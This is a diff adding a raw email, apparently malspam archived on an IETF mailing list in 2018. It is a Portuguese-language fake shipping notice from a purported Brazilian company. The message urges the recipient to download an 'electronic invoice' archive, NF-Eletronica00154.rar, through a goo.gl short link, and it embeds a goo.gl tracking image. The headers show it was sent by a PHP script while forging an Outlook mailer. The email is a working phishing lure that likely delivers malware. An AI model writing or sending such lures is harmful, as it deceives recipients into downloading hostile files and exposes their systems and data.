@@ -1,0 +1,74 @@
+
+From root@ace.igmrepresentacao.com  Wed Feb 28 06:21:18 2018
+Return-Path: <root@ace.igmrepresentacao.com>
+X-Original-To: ietfarch-zeroconf-archive@ietfa.amsl.com
+Delivered-To: ietfarch-zeroconf-archive@ietfa.amsl.com
+Received: from localhost (localhost [127.0.0.1]) by ietfa.amsl.com (Postfix) with ESMTP id 562B4128959 for <ietfarch-zeroconf-archive@ietfa.amsl.com>; Wed, 28 Feb 2018 06:21:18 -0800 (PST)
+X-Quarantine-ID: <fOaiO3dBVkMr>
+X-Virus-Scanned: amavisd-new at amsl.com
+X-Amavis-Alert: BAD HEADER SECTION, Non-encoded 8-bit data (char C3 hex): Subject: Pedido Enviado - IGM - Com\303\251rcio e Represe[...]
+X-Spam-Flag: NO
+X-Spam-Score: 4.804
+X-Spam-Level: ****
+X-Spam-Status: No, score=4.804 tagged_above=-999 required=5 tests=[BAYES_50=0.8, DATE_IN_PAST_03_06=1.592, DKIM_SIGNED=0.1, FORGED_OUTLOOK_HTML=0.021, HTML_MESSAGE=0.001, MIME_HTML_ONLY=0.723, SUBJECT_NEEDS_ENCODING=0.049, SUBJ_ILLEGAL_CHARS=1.518, T_DKIM_INVALID=0.01, T_RP_MATCHES_RCVD=-0.01] autolearn=no autolearn_force=no
+Authentication-Results: ietfa.amsl.com (amavisd-new); dkim=neutral reason="invalid (public key: not available)" header.d=ace.igmrepresentacao.com
+Received: from mail.ietf.org ([4.31.198.44]) by localhost (ietfa.amsl.com [127.0.0.1]) (amavisd-new, port 10024) with ESMTP id fOaiO3dBVkMr for <ietfarch-zeroconf-archive@ietfa.amsl.com>; Wed, 28 Feb 2018 06:21:17 -0800 (PST)
+Received: from ace.igmrepresentacao.com (ace.igmrepresentacao.com [194.182.68.96]) by ietfa.amsl.com (Postfix) with ESMTP id 0505712AF83 for <zeroconf-archive@lists.ietf.org>; Wed, 28 Feb 2018 06:21:16 -0800 (PST)
+Received: by ace.igmrepresentacao.com (Postfix, from userid 0) id 976AFCFF4E; Wed, 28 Feb 2018 08:12:58 -0300 (-03)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=ace.igmrepresentacao.com; s=mail; t=1519825437; bh=In8QrS6idY8RqWE8WD67Q03XTPeLAdYT7YU03PwSNhU=; h=To:Subject:From:Date:From; b=M+TJyUXshDSSKu7FSEGxv9DiA054Hs4apYNViGyRCN58mK89Yd9GX3JU0TRdyNjTy Wn1Gt3lFbZkIs/3fkVMUY0rE/LCRCDz+GsrBe+kTNWJG65zG4k/HCj2QEnviwEDcWn Y5oqSrM2LtVD2jZw4t9keL/5o+NwBPPkHddwIHXs=
+To: zeroconf-archive@lists.ietf.org
+Subject: Pedido Enviado - IGM - ComÃ©rcio e RepresentaÃ§Ã£o LTDA.   (156000)
+X-PHP-Originating-Script: 0:javali.php
+X-Mailer: Microsoft Office Outlook, Build 17.551210
+From: Beatriz Souza <beatrizsouza@ace.igmrepresentacao.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1391faa6cc6bda29a0c4d57be97de4c"
+Message-Id: <20180228134357.976AFCFF4E@ace.igmrepresentacao.com>
+Date: Wed, 28 Feb 2018 08:12:58 -0300 (-03)
+
+Content-Transfer-Encoding: 7bit
+This is a MIME encoded message.
+
+--b1391faa6cc6bda29a0c4d57be97de4c
+Content-Type: text/html; charset="iso-8859-1"
+Content-Transfer-Encoding: 8bit
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<META name=Generator content=4.61>
+<BODY< 
+body><title></title></HEAD>
+<BODY>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'>Bom 
+dia,&nbsp;&nbsp;</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><BR>Seu 
+pedido nº 0018735 realizado em&nbsp; 22/02/2018 13:35 foi entregue à 
+transportadora.</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'>Você 
+receberá seus produtos até o dia 02/03/2018.</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><BR>Segue&nbsp;abaixo 
+a&nbsp;Nota Fiscal Eletrônica nº 00154784214528960024781141458685</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'>&nbsp;</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><FONT 
+color=#0000ff><STRONG><U><A 
+href="https://goo.gl/uH7i8P">NF-Eletronica00154.rar(58kb)</A></U></STRONG></FONT></P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><STRONG><U><FONT 
+color=#0000ff></FONT></U></STRONG>&nbsp;</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'>Beatriz 
+Souza</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'>Dpto. 
+Comercial</P>
+<P 
+style='FONT-SIZE: medium; FONT-FAMILY: "Times New Roman"; WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-decoration-color: initial'><IMG 
+border=0 src="http://www.goo.gl/xyg72u"></P></BODY></HTML>
+
+
